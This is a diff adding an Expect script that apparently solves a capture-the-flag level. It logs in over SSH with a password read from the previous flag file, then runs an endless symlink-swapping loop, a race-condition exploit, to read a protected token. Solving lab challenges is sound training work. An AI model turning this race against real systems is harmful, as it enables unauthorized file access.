@@ -1,0 +1,16 @@
+#!/usr/bin/expect
+
+set ip [ lindex $argv 0 ]
+set port [ lindex $argv 1 ]
+set level [ lindex $argv 2 ]
+set password [ exec cat "../../flag09/flag" ]
+
+spawn ssh "$level\@$ip" "-p $port"
+
+expect "password:" { send "$password\r" }
+
+expect -re {\$ $}
+	send "touch /tmp/token\r"
+	send "while :; do ln -fs /tmp/token /tmp/token10; ln -fs /home/user/level10/token /tmp/token10; done\r"
+
+interact
